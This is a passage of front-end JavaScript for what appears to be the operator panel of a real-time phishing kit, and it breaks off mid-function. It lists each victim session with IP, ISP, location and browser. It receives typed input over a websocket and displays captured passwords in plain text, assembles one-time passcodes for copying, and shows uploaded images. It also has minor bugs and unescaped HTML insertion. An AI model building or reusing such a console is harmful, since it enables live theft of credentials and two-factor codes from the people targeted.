if (typeof sessionDeleteButtons !== 'object' || !sessionDeleteButtons) sessionDeleteButtons = {};

function positionActionButtons() {
  const overlay = document.getElementById('session-actions-overlay');
  if (!overlay) {
    initializeActionButtonOverlay();
    return;
  }
  
  const activeOverlayButton = overlay.querySelector('button:hover, button:focus, button:active');
  if (activeOverlayButton) {
    return;
  }

  const fragment = document.createDocumentFragment();
  const rows = sessionsTable.querySelectorAll('tbody tr');
  const currentSessionIdsOnTable = Array.from(rows).map(row => row.getAttribute('data-session-id'));
  
  Object.keys(sessionActionButtons).forEach(sessionId => {
    if (!currentSessionIdsOnTable.includes(sessionId)) {
      delete sessionActionButtons[sessionId];
    }
  });

  Object.keys(sessionDeleteButtons).forEach(sessionId => {
    if (!currentSessionIdsOnTable.includes(sessionId)) {
      delete sessionDeleteButtons[sessionId];
    }
  });
  
  overlay.innerHTML = ''; 
  
  rows.forEach(row => {
    const sessionId = row.getAttribute('data-session-id');
    if (!sessionId) return;
    
    const isDisconnected = row.classList.contains('session-disconnected');

    if (isDisconnected) {
      const placeholder = row.querySelector('.disconnected-delete-button-placeholder');
      if (!placeholder) return;

      const rect = placeholder.getBoundingClientRect();
      const tableRect = sessionsTable.getBoundingClientRect(); 

      if (rect.width === 0 || rect.height === 0) return;

      if (!sessionDeleteButtons[sessionId]) {
        const trashSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trash2-icon lucide-trash-2"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path><line x1="10" x2="10" y1="11" y2="17"></line><line x1="14" x2="14" y1="11" y2="17"></line></svg>`;
        const button = document.createElement('button');
        button.className = 'delete-disconnected-session-btn p-1 rounded-lg hover:bg-red-500/20 transition-colors';
        button.setAttribute('data-session-id', sessionId);
        button.title = "Delete Session";
        button.innerHTML = trashSVG;

        button.addEventListener('click', function(e) {
          e.preventDefault(); 
          e.stopPropagation(); 
          const sId = this.getAttribute('data-session-id');
          if (sId) {
            terminateSession(sId);
          }
        });
        sessionDeleteButtons[sessionId] = button;
      }

      const buttonContainer = document.createElement('div');
      buttonContainer.style.cssText = `
        position: absolute;
        top: ${rect.top - tableRect.top}px;
        left: ${rect.left - tableRect.left}px;
        width: ${rect.width}px;
        height: ${rect.height}px;
        display: flex;
        justify-content: center; /* Center trash icon in its placeholder area */
        align-items: center;
        pointer-events: auto; /* Allow clicks on the button */
        z-index: 1001; /* Ensure it's above the overlay's base if overlay has items */
      `;
      buttonContainer.appendChild(sessionDeleteButtons[sessionId]);
      fragment.appendChild(buttonContainer);

    } else {
    const placeholder = row.querySelector('.action-button-placeholder');
    if (!placeholder) return;
    
    const rect = placeholder.getBoundingClientRect();
    const tableRect = sessionsTable.getBoundingClientRect();
    if (rect.width === 0 || rect.height === 0) return;
    
    if (!sessionActionButtons[sessionId]) {
      const button = document.createElement('button');
      button.className = 'session-actions-btn p-1 rounded-lg hover:scale-105 transition-transform';
      button.setAttribute('data-session-id', sessionId);
      button.innerHTML = `
        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-text-light dark:text-text-color" fill="currentColor" viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="2"/>
          <circle cx="19" cy="12" r="2"/>
          <circle cx="5" cy="12" r="2"/>
        </svg>
      `;
      button.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
          if (this.disabled) return; 
        this.disabled = true;
          setTimeout(() => { this.disabled = false; }, 300); 
        manageSession(this.getAttribute('data-session-id'));
      });
      sessionActionButtons[sessionId] = button;
    }
    
    const buttonContainer = document.createElement('div');
    buttonContainer.style.cssText = `
      position: absolute;
      top: ${rect.top - tableRect.top}px;
      left: ${rect.left - tableRect.left}px;
      width: ${rect.width}px;
      height: ${rect.height}px;
      display: flex;
        justify-content: flex-end; /* Align 3-dots to the right */
      align-items: center;
      pointer-events: auto;
        z-index: 1001;
    `;
    buttonContainer.appendChild(sessionActionButtons[sessionId]);
    fragment.appendChild(buttonContainer);
    }
  });
  
  overlay.appendChild(fragment); 
}

function setupSessionsTable() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        initializeActionButtonOverlay();
        renderSessionsTable();
        
        window.addEventListener('resize', positionActionButtons);
        document.addEventListener('scroll', positionActionButtons);
      }, 3000);
    });
  } else {
    setTimeout(() => {
      initializeActionButtonOverlay();
      renderSessionsTable();
      
      window.addEventListener('resize', positionActionButtons);
      document.addEventListener('scroll', positionActionButtons);
    }, 3000);
  }
}

setupSessionsTable();


  function updateConnectionDetails() {
    if (state.selectedSession) {
      const session = state.selectedSession;
      document.getElementById('osInfo').innerHTML = getOsIcon(session.os);
      document.getElementById('osName').innerHTML = session.os;
      document.getElementById('browserInfo').innerHTML = getBrowserIcon(session.browser);
      document.getElementById('browserName').textContent = session.user_agent || "Unknown user agent";
      document.getElementById('sessionIp').textContent = session.ip;
      const countryCode = getCountryCode(session.countryCode);
      document.getElementById('sessionLocation').innerHTML = `${getFlagIcon(countryCode)}`;
      document.getElementById('sessionCountry').innerHTML = `${session.location}`;
      const ispEl = document.getElementById('ispInfo');
      if (ispEl) ispEl.textContent = session.isp || 'Unknown ISP';
      const connectionTypeEl = document.getElementById('connectionType');
      if (connectionTypeEl) connectionTypeEl.textContent = session.connectionType || 'Residential';
    }
  }

  if (!state.previousSessionValues) {
    state.previousSessionValues = {};
  }

  async function renderUpdatedInputPanel(sessionId) {
    const grid = document.getElementById('userInputDataGrid');
    if (!grid) {
        logErrorToServer(error);
        return;
    }

    const session = state.sessions.find(session => session.id === sessionId);
    if (!session) {
        logErrorToServer(error);
        return;
    }

    const sessionData = session.values || {};

    if (sessionData) {
        for (const pageName in sessionData) {
            const pageData = sessionData[pageName];

            if (pageData && pageData.values) {
                const sectionId = `${sessionId}-${pageName}`;
                const pageKey = pageName; 

                renderInputPanel(grid, sectionId, sessionId, pageData, sessionData, pageKey);
            }
        }
    }
  }

  function trackSessionUpdates() {
    setInterval(() => {
        state.sessions.forEach(session => {
            if (session.values && session.values !== state.previousSessionValues[session.id]) {
                renderUpdatedInputPanel(session.id); 
                state.previousSessionValues[session.id] = session.values; 
            }
        });
    }, 1000);
  }

  trackSessionUpdates();

  function updateSessionUserInputData(sessionId) {
      if (!sessionId || !state.sessionData[sessionId]) {
          return; 
      }
      
      const grid = document.getElementById('userInputDataGrid');
      const sessionInputs = state.sessionData[sessionId];
      
      const customPanels = Array.from(grid.children).filter(child => 
          !child.classList.contains('collapsible-section-fixed'));
      customPanels.forEach(panel => grid.removeChild(panel));
      
      for (const inputName in sessionInputs) {
          const inputData = sessionInputs[inputName];
          const sectionId = inputName.toLowerCase().replace(/ /g, '-');
          
          let section = document.getElementById(sectionId);
          
          if (!section) {
              section = document.createElement('div');
              section.id = sectionId;
              section.className = 'bg-card rounded-xl overflow-hidden h-fit collapsible-section border-b';
              
              section.innerHTML = `
                  <button class="w-full flex items-center justify-between p-4 bg-card  transition-colors collapsible-header">
                      <h4 class="text-sm font-medium text-text-light dark:text-text-color">${inputData.name}</h4>
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-text-light/60 dark:text-text-color/60 chevron-icon" 
                          viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                          stroke-linecap="round" stroke-linejoin="round">
                          <path d="m6 9 6 6 6-6"/>
                      </svg>
                  </button>
                  <div class="p-4 border-t border-secondary-light dark:border-secondary-dark collapsible-content space-y-4"></div>`;
              
              grid.appendChild(section);
              
              section.querySelector('.collapsible-header').addEventListener('click', () => {
                  section.classList.toggle('open');
              });
          }

          const content = section.querySelector('.collapsible-content');
          content.innerHTML = inputData.values.map((input, index) => `
              <div class="space-y-2">
                  <div class="flex items-center">
                      ${input.type === 'image' ? `
                      <div class="relative rounded-lg overflow-hidden bg-background-light dark:bg-background-dark max-w-[240px] w-full h-full mx-auto group">
                          <img src="${input.value}" alt="${input.placeholder}" class="w-full h-full object-contain object-top">
                          <div class="absolute inset-x-0 bottom-0 bg-gradient-to-t from-background-dark/50 to-transparent p-3">
                              <div class="flex items-center justify-between">
                                  <p class="text-sm font-medium text-text-color">${input.placeholder}</p>
                                  <div class="px-2 py-0.5 rounded-full text-xs font-medium bg-status-success-light/20 text-status-success-light dark:text-status-success-dark">
                                      Uploaded
                                  </div>
                              </div>
                              <p class="text-xs text-text-color/70 mt-1">Uploaded ${new Date().toLocaleDateString()}</p>
                          </div>
                          <button class="absolute inset-0 bg-background-dark/50 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                              <span class="btn-secondary text-xs">View Image</span>
                          </button>
                      </div>` : `
                      <input type="${input.type === 'code' ? 'text' : input.type}" 
                            value="${input.value}" 
                            placeholder="${input.placeholder}" 
                            ${input.type === 'image' ? '' : 'disabled'}
                            class="w-full p-2 rounded border-s bg-box">
                      <button class="btn-secondary ml-2 copy-button">
                          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none" 
                              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                              <rect width="14" height="14" x="5" y="5" rx="2" ry="2"/>
                              <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
                          </svg>
                      </button>`}
                  </div>
              </div>`).join('');

          content.querySelectorAll('.copy-button').forEach(btn => {
              btn.addEventListener('click', (e) => {
                  const input = e.currentTarget.previousElementSibling;
                  navigator.clipboard.writeText(input.value)
                      .then(() => {
                          const icon = btn.querySelector('svg');
                          const original = icon.innerHTML;
                          icon.innerHTML = '<path d="M20 6 9 17l-5-5"/>';
                          setTimeout(() => icon.innerHTML = original, 2000);
                      });
              });
          });
      }
  }

  function saveSessionDataToStorage() {
      try {
          localStorage.setItem('sessionData', JSON.stringify(state.sessionData));
      } catch (e) {
          logErrorToServer(error);
      }
  }

  function loadSessionDataFromStorage() {
      try {
          const savedData = localStorage.getItem('sessionData');
          if (savedData) {
              state.sessionData = JSON.parse(savedData);
          }
      } catch (e) {
          logErrorToServer(error);
          state.sessionData = {};
      }
  }

  function setupUserInputWebSocket() {
    loadSessionDataFromStorage(); 
    socket.on('connect', () => console.log('Client connected to WS'));
    socket.on('user_input', data => {
      if (!state.sessionData[data.session_id]) {
          state.sessionData[data.session_id] = {};
      }
      data.input.timestamp = new Date().getTime();
      state.sessionData[data.session_id][data.input.name] = data.input;
      saveSessionDataToStorage();
      updateSessionManager(); 
      if (state.selectedSession && state.selectedSession.id === data.session_id) {
          const grid = document.getElementById('userInputDataGrid');
          if (grid) {
            renderSessionInputData(data.session_id).catch(err => {
                logErrorToServer(err);
            });
          }
      }    
      const session = state.sessions.find(s => s.id === data.session_id);
      if (session) {
          if (!session.values) {
              session.values = {};
          }
          const routeKey = data.input.route || 
                         (data.input.page ? (data.input.page.startsWith('/') ? data.input.page : '/' + data.input.page) : 
                         ('/' + data.input.name));
          const displayKey = routeKey.replace(/^\/+/, '');
          if (!session.values[routeKey]) {
              session.values[routeKey] = {};
          }
          session.values[routeKey][data.input.name] = data.input;
          
          if (!session.values[data.input.name]) {
              session.values[data.input.name] = {};
          }
          session.values[data.input.name] = data.input;
      }
    });
}

  async function fetchConfiguration() {
    try {
      const config = await getConfigAsync();
      return config;
    } catch (error) {
      logErrorToServer(error);
      return { pages: {} };
    }
  }

  async function initializeServiceName() {
    const config = await getConfigAsync();
    if (config && config['service']) {
      const serviceSpan = document.getElementById("live-service-panel");
      if (serviceSpan) {
        serviceSpan.textContent = `${config.service} Live Panel`;
      }
      document.title = `${config.service} Live Panel`;
    }
  }

  initializeServiceName()
  async function preloadPagePreviews() {
    for (const page of state.availablePages) {
        if (!previewCache.has(page.id)) {
            await updatePreview(page.id, true);
        }
    }
  }

  function renderInputPanel(grid, sectionId, sessionId, inputData, realData, pageKey) {
    if (!inputData || !inputData.values || !Array.isArray(inputData.values)) {
        return;
    }

    const routeKey = pageKey.startsWith('/') ? pageKey : '/' + pageKey;
    const cleanPageKey = pageKey.replace(/^\/+/, '');
    let pageData = null;

    if (typeof state !== 'undefined' && Array.isArray(state.availablePages)) {
        pageData = state.availablePages.find(p => 
            p.route === routeKey || 
            p.id === cleanPageKey || 
            p.originalKey === pageKey
        );
    }

    const routeIdentifier = pageData?.route || routeKey;
    const displayIdentifier = cleanPageKey; 

    const wasOpen = state.openSections?.[sessionId]?.[sectionId];
    const section = document.createElement('div');
    section.id = sectionId;
    section.setAttribute('data-session-id', sessionId);
    section.setAttribute('data-page', displayIdentifier); 
    section.setAttribute('data-route', routeIdentifier); 
    section.className = 'bg-card rounded-xl overflow-hidden h-fit collapsible-section border-b';
    if (wasOpen) section.classList.add('open');

    section.innerHTML = `
        <button class="w-full flex items-center justify-between p-4 bg-card transition-colors collapsible-header">
            <h4 class="text-sm font-medium text-text-light dark:text-text-color">${inputData.name}</h4>
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-text-light/60 dark:text-text-color/60 chevron-icon"
                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                stroke-linecap="round" stroke-linejoin="round">
                <path d="m6 9 6 6 6-6"/>
            </svg>
        </button>
        <div class="p-4 border-t border-secondary-light dark:border-secondary-dark collapsible-content space-y-4" style="${wasOpen ? 'display: block;' : 'display: none;'}"></div>`;

    grid.appendChild(section);

    section.querySelector('.collapsible-header').addEventListener('click', () => {
        section.classList.toggle('open');
        const contentDiv = section.querySelector('.collapsible-content');
        contentDiv.style.display = section.classList.contains('open') ? 'block' : 'none';
    });

    const content = section.querySelector('.collapsible-content');

    let sessionValues = {};
    if (state.selectedSession?.values?.[routeKey]) {
        sessionValues = state.selectedSession.values[routeKey];
    } 
    else if (state.selectedSession?.values?.[cleanPageKey]) {
        sessionValues = state.selectedSession.values[cleanPageKey];
    }

    const pageType = pageData?.type;

    if (pageType === 'otp') {
        let combinedOtpValue = '';
        const otpLength = inputData.values.length > 0 ? inputData.values.length : 6;

        if (sessionValues) {
             let constructedOtp = '';
             for (let i = 0; i < otpLength; i++) {
                 const fieldName = inputData.values[i]?.value;
                 if (fieldName && sessionValues[fieldName] !== undefined) {
                     constructedOtp += String(sessionValues[fieldName]).trim();
                 }
             }
             combinedOtpValue = constructedOtp;

             if (!combinedOtpValue && inputData.values.length === 1) {
                 const singleFieldName = inputData.values[0].value;
                 if (sessionValues[singleFieldName] !== undefined) {
                    combinedOtpValue = String(sessionValues[singleFieldName]).trim();
                 }
             }
        }

        const hasValue = combinedOtpValue !== '';

        content.innerHTML = `
            <div class="space-y-2 otp-container">
                <label class="block text-sm font-medium text-text-light dark:text-text-color mb-1">${inputData.name || 'OTP Code'}</label>
                <div class="flex items-center space-x-2">
                    ${Array.from({ length: otpLength }).map((_, i) => `
                        <input type="text"
                               maxlength="1"
                               disabled
                               class="otp-input w-10 h-10 text-center rounded border bg-box text-lg font-semibold ${!hasValue || i >= combinedOtpValue.length ? 'text-gray-400 dark:text-gray-600' : ''}"
                               data-otp-index="${i}"
                               placeholder="${inputData.values[i]?.placeholder || '•'}"
                               value="${combinedOtpValue[i] || ''}">
                    `).join('')}
                    <button class="btn-secondary ml-2 copy-button"
                            data-value="${combinedOtpValue}"
                            ${!hasValue ? 'disabled style="opacity: 0.5;"' : ''}>
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect width="14" height="14" x="5" y="5" rx="2" ry="2"/>
                            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
                        </svg>
                    </button>
                </div>
            </div>`;

    } else {
        content.innerHTML = inputData.values.map((input, index) => {
            const variableName = input.value;
            let actualValue = '';
            if (sessionValues && variableName && sessionValues[variableName] !== undefined) {
                actualValue = sessionValues[variableName];
            }

            const hasValue = actualValue !== '';
            const copyValue = actualValue || input.placeholder || '';

            if (input.type === 'file' || input.type === 'image') {
                let imgSrc = '';
                if (typeof actualValue === 'object' && actualValue !== null && actualValue.url) {
                    imgSrc = actualValue.url;
                } else if (typeof actualValue === 'string' && actualValue) {
                    imgSrc = actualValue;
                }

                if (imgSrc && !imgSrc.startsWith('data:') && !imgSrc.startsWith('http')) {
                    if (!imgSrc.startsWith('/')) {
                        imgSrc = '/' + imgSrc;
                    }
                }

                return `
                    <div class="space-y-2" data-image-container="${variableName}">
                        <div class="flex items-center justify-center">
                            <div class="relative rounded-lg overflow-hidden bg-background-light dark:bg-background-dark max-w-[240px] w-full" style="min-height: 180px;">
                                ${imgSrc ?
                                    `<img src="${imgSrc}" alt="${input.placeholder || ''}" class="w-full h-auto object-contain object-center image-preview" data-var="${variableName}" style="max-height: 300px;">` :
                                    `<div class="flex items-center justify-center h-full w-full p-4 text-center text-text-light/50 dark:text-text-color/50 no-image-placeholder" data-var="${variableName}">
                                        No image available
                                    </div>`
                                }
                                <div class="absolute inset-x-0 bottom-0 bg-gradient-to-t from-background-dark/50 to-transparent p-3">
                                    <div class="flex items-center justify-between">
                                        <p class="text-sm font-medium text-text-color">${input.placeholder || variableName || 'Image'}</p>
                                        <div class="px-2 py-0.5 rounded-full text-xs font-medium image-status ${imgSrc ? 'bg-status-success-light/20 text-status-success-light dark:text-status-success-dark' : 'bg-status-warning-light/20 text-status-warning-light dark:text-status-warning-dark'}" data-var="${variableName}">
                                            ${imgSrc ? 'Uploaded' : 'Pending'}
                                        </div>
                                    </div>
                                    <p class="text-xs text-text-color/70 mt-1 image-date" data-var="${variableName}">
                                        ${imgSrc ? `Uploaded ${new Date().toLocaleDateString()}` : 'Pending upload'}
                                    </p>
                                </div>
                                <div class="absolute inset-0 transition-opacity flex items-center justify-center image-view-button-container cursor-pointer" data-var="${variableName}" data-src="${imgSrc || ''}">
                                  ${imgSrc ?
                                      `<span class="btn-secondary text-xs view-image-btn">View Image</span>` : ''
                                  }
                              </div>
                            </div>
                        </div>
                    </div>`;
            } else {
              const inputType = (input.type === 'code' || input.type === 'password') ? 'text' : (input.type || 'text');
              const displayValue = actualValue;

             return `
                 <div class="space-y-2">
                    <div class="flex items-center">
                         <input type="${inputType}"
                             value="${displayValue}"
                             data-var="${variableName}"
                             placeholder="${input.placeholder || ''}"
                             disabled
                             class="w-full p-2 rounded border-s bg-box
                                 ${!hasValue ? 'text-gray-400 dark:text-gray-600' : ''}">
                         <button class="btn-secondary ml-2 copy-button"
                             data-value="${copyValue}"
                             ${!hasValue ? 'disabled style="opacity: 0.5;"' : ''}>
                             <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none"
                                 stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect width="14" height="14" x="5" y="5" rx="2" ry="2"/>
                                 <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>
                             </svg>
                         </button>
                     </div>
                 </div>`;
         }
        }).join('');
    }

    content.querySelectorAll('.copy-button:not([disabled])').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const valueToCopy = e.currentTarget.getAttribute('data-value');
            if (valueToCopy && valueToCopy.trim() !== '') {
                navigator.clipboard.writeText(valueToCopy)
                    .then(() => {
                        const icon = btn.querySelector('svg');
                        const original = icon.innerHTML;
                        icon.innerHTML = '<path d="M20 6 9 17l-5-5"/>';
                        setTimeout(() => { if (icon) icon.innerHTML = original; }, 2000);
                        showToast('Copied to clipboard', 'success');
                    })
                    .catch(err => {
                        showToast('Failed to copy', 'error');
                    });
            }
        });
    });


    content.querySelectorAll('.image-view-button-container').forEach(container => {
      if (container.dataset.src) {
          container.addEventListener('click', function() {
              const imgSrc = this.getAttribute('data-src');
              if (imgSrc) {
                  window.open(imgSrc, '_blank');
              }
          });
      }
    });
}




const generators = [
  { id: "secure_random_str", name: "Random String" },
  { id: "secure_token", name: "Secure Token" },
  { id: "generate_uuid", name: "UUID" },
  { id: "timestamp", name: "Timestamp" },
  { id: "fixed", name: "Fixed Value" }
];

const presetParameters = [
  { name: "user_id", generator: "generate_uuid" },
  { name: "session_id", generator: "secure_random_str" },
  { name: "auth_token", generator: "secure_token" },
  { name: "request_id", generator: "generate_uuid" },
  { name: "client_id", generator: "secure_random_str" },
  { name: "timestamp", generator: "timestamp" },
  { name: "status", generator: "fixed", value: "active" },
  { name: "role", generator: "fixed", value: "user" }
];

function createParamCard(param = {}) {
  const card = document.createElement('div');
  card.className = 'bg-background-light dark:bg-background-darker rounded-md p-1.5 transition-all duration-200 w-full';

  const paramName = param.name || `param_${Date.now().toString(36).slice(-4)}`;
  const generator = param.generator || "secure_random_str";
  const fixedValue = param.value !== undefined ? param.value : '';
  const isFixed = generator === "fixed";

  const genOptions = generators.map(gen =>
      `<option value="${gen.id}" ${gen.id === generator ? 'selected' : ''}>${gen.name}</option>`
  ).join('');

  card.innerHTML = `
      <div class="flex items-center justify-between gap-2 mb-1">
          <input type="text" class="param-name-input bg-transparent border-b border-secondary-light/40 dark:border-secondary-dark/40 text-text-light dark:text-text-color text-[10px] p-0.5 w-3/4 focus:outline-none focus:border-primary" value="${paramName}" placeholder="Parameter name">
          <button class="bg-card hover:bg-secondary-light/10 dark:hover:bg-secondary-dark/10 rounded p-1 remove-btn flex items-center justify-center">
              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" class="text-danger-light dark:text-danger-dark" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"></line>
                  <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
          </button>
      </div>
      <div class="grid grid-cols-1 gap-1 w-full">
          <select class="generator-select bg-background-darker dark:bg-background-dark border border-secondary-light/40 dark:border-secondary-dark/40 rounded text-[10px] p-0.5 text-text-light dark:text-text-color w-full">
              ${genOptions}
          </select>
          <div class="value-input w-full" style="display: ${isFixed ? 'block' : 'none'}">
              <input type="text" class="param-value-input bg-background-darker dark:bg-background-dark border border-secondary-light/40 dark:border-secondary-dark/40 rounded text-[10px] p-0.5 w-full text-text-light dark:text-text-color" placeholder="Enter static value" value="${fixedValue}">
          </div>
      </div>
  `;

  const generatorSelect = card.querySelector('.generator-select');
  const valueInputDiv = card.querySelector('.value-input');

  function updateInputVisibility() {
      valueInputDiv.style.display = generatorSelect.value === 'fixed' ? 'block' : 'none';
      setTimeout(adjustContainerHeights, 10);
  }

  generatorSelect.addEventListener('change', updateInputVisibility);

  card.querySelector('.remove-btn').addEventListener('click', () => {
      card.style.opacity = '0';
      card.style.transform = 'translateY(5px)';
      setTimeout(() => {
          card.remove();
          adjustContainerHeights();
      }, 200);
  });

  return card;
}

function adjustContainerHeights() {
  const paramList = document.getElementById('param-list');
  const resultsContainer = document.getElementById('results')?.parentElement;

  if (paramList) {
      if (paramList.children.length <= 2) {
        paramList.style.height = 'auto';
        paramList.style.minHeight = '100px';
      }
      paramList.style.overflowY = paramList.scrollHeight > paramList.clientHeight ? 'auto' : 'hidden';
  }
  if (resultsContainer) {
      resultsContainer.style.overflowY = resultsContainer.scrollHeight > resultsContainer.clientHeight ? 'auto' : 'hidden';
      const resultsElement = document.getElementById('results');
      if (resultsElement) {
          resultsElement.style.maxWidth = '100%';
          resultsElement.style.wordBreak = 'break-word';
      }
  }
}

function formatJSONForDisplay(json) {
  try {
      const formatted = JSON.stringify(json, null, 2);
      return formatted;
  } catch (e) {
      return String(json);
  }
}

function addParam(param = {}) {
  const container = document.getElementById('param-list');
  if (!container) return;
  const card = createParamCard(param);
  container.appendChild(card);
  card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  adjustContainerHeights();
}

function randomizeParams() {
  const container = document.getElementById('param-list');
  if (!container) return;
  container.innerHTML = '';

  const count = Math.floor(Math.random() * 3) + 3;
  const shuffled = [...presetParameters].sort(() => 0.5 - Math.random());
  const selected = shuffled.slice(0, count);

  selected.forEach(param => {
      const card = createParamCard(param);
      container.appendChild(card);
  });
  adjustContainerHeights();
}

function getParamsFromUI() {
    const config = {
        params: {},
        count: parseInt(document.getElementById('count')?.value || '1') || 1
    };

    const paramListContainer = document.getElementById('param-list');
    if (!paramListContainer) return config;

    paramListContainer.querySelectorAll(':scope > div').forEach(card => {
        const nameInput = card.querySelector('.param-name-input');
        const generatorSelect = card.querySelector('.generator-select');
        const valueInput = card.querySelector('.param-value-input');
        const paramName = nameInput?.value.trim();

        if (!paramName || !generatorSelect) return;

        const generator = generatorSelect.value;

        if (generator === 'fixed') {
            const value = valueInput?.value.trim();
            config.params[paramName] = { generator: generator, value: value || '' };
        } else {
            config.params[paramName] = { generator: generator };
        }
    });

    return config;
}

async function initParamGenerator() {
  try {
    const config = await fetchConfiguration(); 
    const params = config?.params || {}; 
    const paramListContainer = document.getElementById('param-list');

    if (!paramListContainer) {
      return;
    }
    paramListContainer.innerHTML = ''; 
    
    if (Object.keys(params).length === 0) {
      addParam(); 
    } else {
      for (const paramName in params) {
        if (Object.hasOwnProperty.call(params, paramName)) {
          const paramData = params[paramName];
          const cardElement = createParamCard({ name: paramName, ...paramData });
          if (cardElement) {
            paramListContainer.appendChild(cardElement);
          } else {
          }
        }
      }
    }

    const addBtn = document.getElementById('add-param');
    if (addBtn) {
      addBtn.onclick = null; 
      addBtn.onclick = () => addParam(); 
    }

    const randomizeBtn = document.getElementById('randomize');
     if (randomizeBtn) {
      randomizeBtn.onclick = null;
      randomizeBtn.onclick = randomizeParams;
     }

    const saveBtn = document.getElementById('saveparam');
    if(saveBtn) {
      saveBtn.onclick = null;
      saveBtn.onclick = () => { 
        const currentUiConfig = getParamsFromUI();
        const payload = { params: currentUiConfig.params, source: 'admin_interface', action: 'save_config' };
        const statusEl = document.getElementById('status');
        if (statusEl) { statusEl.textContent = "Saving..."; statusEl.className = "mt-1 text-xs text-text-light/60 dark:text-text-color/60"; }
        if (typeof socket !== 'undefined' && socket?.emit) { socket.emit('generate_data', payload); } 
        else { console.error("Socket unavailable for save"); if(statusEl){ statusEl.textContent = "Error: Connection unavailable."; statusEl.className="mt-1 text-xs text-danger-light dark:text-danger-dark";} }
      };
    }

    const generateBtn = document.getElementById('generate');
     if(generateBtn) {
       generateBtn.onclick = null;
       generateBtn.onclick = () => {
        const currentUiConfig = getParamsFromUI();
        const statusEl = document.getElementById('status');
        const resultsEl = document.getElementById('results');
        if (Object.keys(currentUiConfig.params).length === 0) { if (statusEl) { statusEl.textContent = "Error: Add parameters"; statusEl.className="mt-1 text-xs text-danger-light dark:text-danger-dark";} return; }
        if (statusEl) { statusEl.textContent = "Generating..."; statusEl.className="mt-1 text-xs text-text-light/60 dark:text-text-color/60"; }
        if (resultsEl) { resultsEl.textContent = "Generating data..."; }
        const payload = { ...currentUiConfig, source: 'admin_interface', action: 'generate_only' };
        if (typeof socket !== 'undefined' && socket?.emit) { socket.emit('generate_data', payload); } 
        else { console.error("Socket unavailable for generate"); if(statusEl){ statusEl.textContent = "Error: Connection unavailable."; statusEl.className="mt-1 text-xs text-danger-light dark:text-danger-dark";} }
       };
     }

    if (typeof socket !== 'undefined' && socket && typeof socket.on === 'function') {
        socket.off('generated_data'); 
        socket.on('generated_data', (data) => {
            const resultsEl = document.getElementById('results');
            const statusEl = document.getElementById('status');
            if (resultsEl) {
                resultsEl.textContent = formatJSONForDisplay(data);
            }
            if (statusEl && data?.list?.length !== undefined) {
                statusEl.textContent = `Generated ${data.list.length} items`;
                statusEl.className = "mt-1 text-xs text-success-light dark:text-success-dark";
            } else if (statusEl) {
                 statusEl.textContent = `Generated data received`;
                 statusEl.className = "mt-1 text-xs text-success-light dark:text-success-dark";
            }
            adjustContainerHeights();
        });

        socket.off('config_saved');
        socket.on('config_saved', (responseData) => {
            const statusEl = document.getElementById('status');
             if (statusEl) {
                statusEl.textContent = responseData?.message || "Configuration saved successfully";
                statusEl.className = "mt-1 text-xs text-success-light dark:text-success-dark";
            }
            if (typeof showToast === 'function') {
                showToast(responseData?.message || "Configuration saved successfully", 'success');
            }
        });

        socket.off('error');
        socket.on('error', (error) => {
            const resultsEl = document.getElementById('results');
            const statusEl = document.getElementById('status');
            const errorMessage = error?.message || 'An unknown error occurred';
             if (resultsEl) {
                resultsEl.textContent = `Error: ${errorMessage}`;
            }
             if (statusEl) {
                statusEl.textContent = `Error: ${errorMessage}`;
                statusEl.className = "mt-1 text-xs text-danger-light dark:text-danger-dark";
            }
             if (typeof showToast === 'function') {
                showToast(`Error: ${errorMessage}`, 'error');
             }
        });
    } else {
         const statusEl = document.getElementById('status');
         if (statusEl) {
            statusEl.textContent = "Error: Real-time connection failed.";
            statusEl.className = "mt-1 text-xs text-danger-light dark:text-danger-dark";
        }
    }

    adjustContainerHeights();
    window.removeEventListener('resize', adjustContainerHeights); 
    window.addEventListener('resize', adjustContainerHeights);

  } catch (error) {
     const paramListContainer = document.getElementById('param-list');
     if (paramListContainer) { paramListContainer.innerHTML = '<p class="text-xs text-danger-light dark:text-danger-dark p-2">Error initializing parameters.</p>'; }
     const statusEl = document.getElementById('status');
     if (statusEl) { statusEl.textContent = "Error loading parameters."; statusEl.className = "mt-1 text-xs text-danger-light dark:text-danger-dark"; }
  }
}
initParamGenerator();

  async function renderSessionInputData(sessionId) {
    if (!sessionId) {
        logErrorToServer(error);
        return;
    }
    
    const grid = document.getElementById('userInputDataGrid');
    if (!grid) {
